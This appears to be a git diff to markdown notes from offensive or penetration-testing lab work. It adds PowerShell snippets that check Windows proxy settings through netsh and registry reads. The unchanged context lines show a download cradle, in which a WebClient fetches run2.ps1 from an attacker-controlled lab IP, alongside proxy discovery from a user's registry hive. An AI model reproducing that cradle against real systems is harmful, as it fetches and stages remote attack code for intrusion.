@@ -191,3 +191,32 @@ $proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\Curren
 $wc = new-object system.net.WebClient
 $wc.DownloadString("http://192.168.119.120/run2.ps1")
 ```
+
+### Check for proxies
+
+- cmd
+```cmd
+$proxySettings = netsh winhttp show proxy
+
+if ($proxySettings -match "Direct access") {
+    Write-Host "No proxy is configured."
+} else {
+    Write-Host "Proxy is configured."
+    Write-Host $proxySettings
+}
+
+```
+- powershell
+```powershell
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
+$proxyEnabled = Get-ItemProperty -Path $regPath -Name ProxyEnable -ErrorAction SilentlyContinue
+$proxyServer = Get-ItemProperty -Path $regPath -Name ProxyServer -ErrorAction SilentlyContinue
+
+if ($proxyEnabled.ProxyEnable -eq 1) {
+    Write-Host "Proxy is enabled."
+    Write-Host "Proxy server: $($proxyServer.ProxyServer)"
+} else {
+    Write-Host "Proxy is not enabled."
+}
+
+```
